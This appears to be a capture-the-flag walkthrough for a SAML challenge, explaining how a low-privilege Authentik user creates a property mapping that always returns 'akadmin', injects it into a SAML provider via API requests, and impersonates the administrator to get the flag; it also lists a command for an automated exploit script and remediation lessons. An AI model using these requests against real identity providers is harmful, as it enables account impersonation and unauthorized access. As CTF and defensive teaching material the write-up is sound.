================================================================================================
   ____    _    __  __ _        ____ _____ _____   ______  ______  _     ___  ___ _____ 
  / ___|  / \  |  \/  | |      / ___|_   _|  ___| | ____\ \/ /  _ \| |   / _ \|_ _|_   _|
  \___ \ / _ \ | |\/| | |     | |     | | | |_    |  _|  \  /| |_) | |  | | | || |  | |  
   ___) / ___ \| |  | | |___  | |___  | | |  _|   | |___ /  \|  __/| |__| |_| || |  | |  
  |____/_/   \_\_|  |_|_____|  \____| |_| |_|     |_____/_/\_\_|   |_____\___/|___| |_|  
                                                                                          
================================================================================================

ğŸ¯ CHALLENGE: Get the flag by appearing as user 'akadmin' via SAML authentication

ğŸ“ TARGET: https://saml-web.challs.infobahnc.tf
ğŸ”‘ CREDS: sahas / 123

================================================================================================
                                    VULNERABILITY
================================================================================================

The application trusts SAML assertions without verifying that the username claim matches
the actual authenticated user. If we can control the SAML property mappings on the IdP
(Authentik), we can inject a mapping that always returns "akadmin" regardless of who logs in.

================================================================================================
                                 EXPLOITATION STEPS
================================================================================================

PHASE 1: RECONNAISSANCE
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

1. Login as sahas/123 â†’ Get session cookie
2. Check API access: /api/v3/core/users/me/
3. Enumerate permissions: Can we create property mappings?

PHASE 2: WEAPONIZATION
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

4. Create malicious SAML property mapping:
   
   POST /api/v3/propertymappings/saml/
   {
     "name": "evil-username-override",
     "saml_name": "http://schemas.goauthentik.io/2021/02/saml/username",
     "expression": "return 'akadmin'"
   }

5. Find flaggetter SAML provider ID:
   
   GET /api/v3/providers/saml/?search=flaggetter

PHASE 3: INJECTION
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

6. Inject malicious mapping into provider:
   
   PATCH /api/v3/providers/saml/{provider_id}/
   {
     "property_mappings": ["<malicious_mapping_id>"]
   }

PHASE 4: EXPLOITATION
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

7. Trigger new SAML authentication:
   
   Visit: https://saml-web.challs.infobahnc.tf/flag

8. Login when redirected (still as sahas/123)

9. SAML assertion now contains username="akadmin"

10. Application checks: username === 'akadmin' â†’ TRUE

11. ğŸ FLAG REVEALED!

================================================================================================
                                  AUTOMATED EXPLOIT
================================================================================================

Run the provided tool to automate the entire process:

    node authentik_api.js \
      --target https://saml-web.challs.infobahnc.tf \
      --session "authentik_session=YOUR_COOKIE_HERE"

Tool will:
  âœ“ Verify API access
  âœ“ Create malicious mapping
  âœ“ Find flaggetter provider
  âœ“ Inject mapping
  âœ“ Provide next steps

================================================================================================
                                  ATTACK FLOW DIAGRAM
================================================================================================

    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚   Browser   â”‚ 1. Login as sahas
    â”‚   (sahas)   â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                    â”‚
                                       â–¼
                              â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                              â”‚   Authentik    â”‚
                              â”‚   (IdP/SSO)    â”‚
                              â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                       â”‚
                                       â”‚ 2. Get session cookie
                                       â–¼
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”           â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚ authentik_  â”‚           â”‚  API Endpoint  â”‚
    â”‚   api.js    â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚ /api/v3/...    â”‚
    â”‚  (exploit)  â”‚ 3. Create â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    malicious
          â”‚            mapping
          â”‚
          â”‚ 4. Inject into
          â”‚    provider
          â–¼
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚  SAML Provider (flaggetter)             â”‚
    â”‚  Property Mappings:                     â”‚
    â”‚    [X] evil-username (returns akadmin)  â”‚ â† INJECTED!
    â”‚    [ ] default-username (returns sahas) â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
          â”‚
          â”‚ 5. Next auth request
          â–¼
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚   Browser   â”‚ 6. Visit /flag
    â”‚   (sahas)   â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                    â”‚
                                       â–¼
                              â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                              â”‚  Flaggetter    â”‚
                              â”‚  Application   â”‚
                              â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                       â”‚
                                       â”‚ 7. Redirect to IdP
                                       â–¼
                              â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                              â”‚   Authentik    â”‚
                              â”‚  (uses EVIL    â”‚
                              â”‚   mapping!)    â”‚
                              â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                       â”‚
                                       â”‚ 8. Generate SAML
                                       â”‚    username="akadmin"
                                       â–¼
                              â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                              â”‚ SAMLResponse   â”‚
                              â”‚ (SIGNED, valid)â”‚
                              â”‚ user=akadmin   â”‚ â† Trusted but malicious!
                              â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                       â”‚
                                       â”‚ 9. Verify signature âœ“
                                       â”‚ 10. Extract username
                                       â–¼
                              â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                              â”‚  Flaggetter    â”‚
                              â”‚  if (username  â”‚
                              â”‚   === akadmin) â”‚
                              â”‚    show FLAG   â”‚
                              â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                       â”‚
                                       â–¼
                                  ğŸ SUCCESS!

================================================================================================
                                  SECURITY LESSONS
================================================================================================

ğŸ”´ VULNERABILITY: Property Mapping Privilege Escalation
   - Regular users should NOT be able to create/modify SAML attribute mappings
   - This breaks the trust model between IdP and Service Provider

ğŸŸ¡ DEFENSE GAPS:
   - No verification that username claim matches authenticated user
   - Implicit trust: "If IdP says username=X, then user IS X"
   - Missing RBAC on critical configuration endpoints

ğŸŸ¢ WHAT WAS DONE RIGHT:
   - XML signature verification (using xml-crypto)
   - Signature wrapping protections
   - Transform restrictions

ğŸ’¡ REMEDIATION:
   1. Restrict property mapping creation to administrators only
   2. Add additional claim validation for privileged attributes
   3. Implement correlation between authenticated session and claims
   4. Audit log all mapping changes
   5. Consider claim constraints at SP side (e.g., username must match session)

================================================================================================
                                    TOOL REFERENCE
================================================================================================

ğŸ“ authentik_api.js     â†’ Automated exploit (creates mapping, injects into provider)
ğŸ“ saml_decoder.js      â†’ Decode and analyze SAML responses
ğŸ“ cookie_helper.js     â†’ Format cookies correctly
ğŸ“ START_HERE.md        â†’ Quick start guide (you should read this first!)
ğŸ“ QUICKSTART.md        â†’ Detailed quick start
ğŸ“ EXPLOIT_GUIDE.md     â†’ All attack vectors explained
ğŸ“ README.md            â†’ Complete documentation

================================================================================================
                                   QUICK COMMANDS
================================================================================================

# Install dependencies
npm install xmldom

# Run exploit
node authentik_api.js --target https://saml-web.challs.infobahnc.tf --session "authentik_session=XXX"

# Decode SAML response
node saml_decoder.js "BASE64_SAML_HERE"

# Test cookie validity
Invoke-RestMethod -Uri "https://saml-web.challs.infobahnc.tf/api/v3/core/users/me/" -Headers @{"Cookie"="authentik_session=XXX"}

================================================================================================
                                  SUCCESS INDICATORS
================================================================================================

âœ“ Can access /api/v3/core/users/me/ with session cookie
âœ“ Property mapping created (returns mapping ID)
âœ“ Provider found (flaggetter)
âœ“ Provider updated with malicious mapping
âœ“ SAML decoder shows username="akadmin"
âœ“ /flag endpoint displays flag instead of "not authorized"

================================================================================================

ğŸš€ Ready to exploit? Run:  node authentik_api.js --help

Good luck! ğŸ´â€â˜ ï¸

================================================================================================
